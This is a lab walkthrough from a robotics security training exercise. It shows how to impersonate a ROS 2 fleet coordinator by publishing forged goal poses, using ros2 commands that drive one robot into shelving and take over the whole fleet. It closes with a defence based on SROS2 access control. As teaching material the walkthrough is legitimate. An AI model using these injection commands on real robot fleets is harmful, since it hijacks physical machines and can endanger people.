# NECROS · Scenario 3 · "Rogue Coordinator" · Attack Walkthrough

## What you will learn

This fleet has a boss. One program, called the **coordinator**, tells each robot where
to go by sending it goal positions. The robots simply trust and obey whatever goals
arrive, and nothing on the network proves that the sender is really the coordinator.

In this scenario you impersonate the coordinator. By sending your own goals to the
robots, you command the entire fleet as if you were in charge.

How this differs from earlier scenarios:

- Scenario 1 forced a robot by sending raw motor commands.
- Scenario 2 fed a robot a false view of the world.
- Scenario 3 pretends to be the fleet's boss and issues orders the robots accept.

**Your mission (shown on the console):** command the whole fleet by impersonating its
coordinator.

---

## Before you start

Bring up the lab and open the console:

```bash
docker compose up -d
```

Open **http://localhost:3000**, click into **Scenario 3 (Rogue Coordinator)**. Two
robots, `amr1` and `amr2`, patrol a logistics yard under the coordinator's direction.

Open a terminal on the attacker machine and set the DDS domain to 3 (the domain number
always matches the scenario number):

```bash
docker compose exec attacker bash
export ROS_DOMAIN_ID=3
```

> DDS (Data Distribution Service) is the messaging layer the robots use, and it only
> connects programs on the same domain number. If a command shows nothing, confirm
> `echo $ROS_DOMAIN_ID` prints `3`.

---

## Phase 1 · Reconnaissance: find the coordinator and the command channel

List who is on the network:

```bash
ros2 node list
```

You will see the robots (`/amr1/amr`, `/amr2/amr`) and the boss, `/fleet_coordinator`.

Now list the topics (communication channels) and their message types:

```bash
ros2 topic list -t
```

The channel that matters is each robot's goal channel:

```
/amr1/goal_pose [geometry_msgs/msg/Pose]
/amr2/goal_pose [geometry_msgs/msg/Pose]
```

`goal_pose` is where the coordinator sends "drive to this position". Confirm who is
currently sending on it with the detailed topic information:

```bash
ros2 topic info /amr1/goal_pose --verbose
```

It reports `Publisher count: 1` and the publisher's node name, `fleet_coordinator`.
That single publisher is the legitimate boss, the authority you are about to
impersonate.

Finally, ask the system what a goal message looks like, so your fake goal is
well-formed:

```bash
ros2 interface show geometry_msgs/msg/Pose
```

A `Pose` message has a `position` (with `x`, `y`, `z`) and an `orientation`. For this
attack you only need the position.

> On the console, the DDS Bus panel marks `/amrN/goal_pose` as "exposed". That is your
> hint that the goal channel is the attack surface.

---

## Phase 2 · Impersonate the coordinator and take over a robot

The robots obey whichever goal arrives most recently. The real coordinator only sends a
new goal every few seconds, so if you send goals ten times per second, your goals win
and the robot follows you.

Send `amr1` to a position inside the yard's shelving (there is a rack around position
x = 3.0, y = 1.6, so it will be driven into it). The `-r 10` option repeats the goal 10
times per second:

```bash
ros2 topic pub -r 10 /amr1/goal_pose geometry_msgs/msg/Pose \
  "{position: {x: 3.0, y: 1.6, z: 0.0}}"
```

**What you will see on the console:**

- The yard turns red and a "coordinator impersonation" alert appears.
- `/goal_pose` is flagged as hijacked, and an uninvited intruder node shows on the DDS
  Bus panel.
- `amr1` leaves its patrol route, is driven into the shelving, and emergency-stops.

You can confirm the impersonation from a second terminal (remember to set
`export ROS_DOMAIN_ID=3` there too):

```bash
ros2 topic info /amr1/goal_pose --verbose
```

It now reports `Publisher count: 2`: the real coordinator plus you. That extra
publisher is exactly how the system detects the impersonation.

---

## Phase 3 · Take over the whole fleet

Open a second attacker terminal and command `amr2` at the same time:

```bash
docker compose exec attacker bash
export ROS_DOMAIN_ID=3
ros2 topic pub -r 10 /amr2/goal_pose geometry_msgs/msg/Pose \
  "{position: {x: -3.0, y: -1.6, z: 0.0}}"
```

Both robots now obey you. The entire fleet is under your control.

Stop every attack with `Ctrl-C` in each terminal. The real coordinator takes back
control and the fleet returns to its patrol.

---

## Why the attack works

1. The goal channel accepts a goal from anyone. The robot obeys the message, not a
   verified sender.
2. "Coordinator" is only a convention. Nothing on the open network ties the act of
   sending goals to a specific, trusted program, so whoever sends goals effectively
   becomes the coordinator.
3. Discovery is open, so you learned exactly what to send with no prior knowledge.

The robots are not broken; they are doing exactly what they are told. The flaw is that
there is no check of who is allowed to give the orders.

---

## How it is defended (the Defend phase)

Turning on SROS2 (Secure ROS 2) with an access-control policy ties the goal channel to
the coordinator's identity: only the real coordinator is permitted to send goals, and
the robots may only receive them. Your uninvited node has no certificate permitting it
to send goals, so the fleet never accepts them. See the Scenario 3 Defend walkthrough.

---

## Quick checklist

- [ ] `ros2 node list` shows `/fleet_coordinator` and the two robots.
- [ ] `ros2 topic info /amr1/goal_pose --verbose` shows `Publisher count: 1` before the
      attack.
- [ ] Publishing to `/amr1/goal_pose` drives `amr1` into the shelving; the console shows
      coordinator impersonation and a hijacked goal channel.
- [ ] During the attack, `ros2 topic info /amr1/goal_pose --verbose` shows
      `Publisher count: 2`.
- [ ] Commanding `/amr2/goal_pose` from a second terminal takes over the whole fleet.
- [ ] `Ctrl-C` restores the coordinator's control and the fleet resumes its patrol.
